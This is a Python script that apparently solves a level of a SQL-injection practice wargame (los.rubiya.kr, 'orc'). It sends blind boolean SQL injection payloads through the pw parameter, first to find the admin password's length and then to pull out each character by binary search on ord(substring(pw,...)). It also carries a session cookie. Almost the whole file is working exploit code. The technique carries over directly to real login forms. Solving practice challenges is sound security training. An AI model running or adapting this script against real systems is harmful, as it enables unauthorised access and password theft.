import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookie = 'uvvu5fnca7q6nh9orhah9pvp9i'

# Get the length of the password
length = 1
while True:
    payload = f"?pw=0' or id='admin' and length(pw)={length} %23 "

    res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})

    if '<h2>Hello admin</h2>' in res.text:
        break

    length += 1

print(f'*** Found length: {length} ***')

# Get the password by binary search
password = ''
for i in range(1, length + 1):

    low = ord('0')
    high = ord('z')
    while low <= high:
        mid = (low + high) // 2
        payload = f"?pw=0' or id='admin' and ord(substring(pw,{i},1))<={mid} %23 "
        res = requests.get(url=f'{url}{payload}', cookies={'PHPSESSID': cookie})

        if '<h2>Hello admin</h2>' in res.text:
            high = mid - 1
        else:
            low = mid + 1
    password += chr(low)
    print(f'Current password: {password}')

print(f'*** Found Password: {password} ***')
